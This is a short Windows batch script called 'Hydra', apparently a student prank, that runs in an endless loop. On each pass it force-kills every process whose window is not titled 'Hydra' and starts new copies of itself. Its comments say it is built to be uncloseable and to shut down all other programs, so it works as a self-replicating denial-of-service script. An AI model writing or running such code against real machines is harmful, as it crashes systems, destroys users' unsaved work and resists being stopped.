@ECHO OFF
::What if we use a text document to keep track of how many have opened, so all programs know how many to test for.
::Can't, you would have errors since too many files are trying to access it at the same time
::PAY ATTENTION TO MR HALL!
title Hydra
:loop
SET n=1
::Lets make this uncloseable by all other programs. 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
::Closes everything except for itself. They have to have a batch file already on their desktop to stop this one.
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
SET /a n+=1
)
GOTO :loop
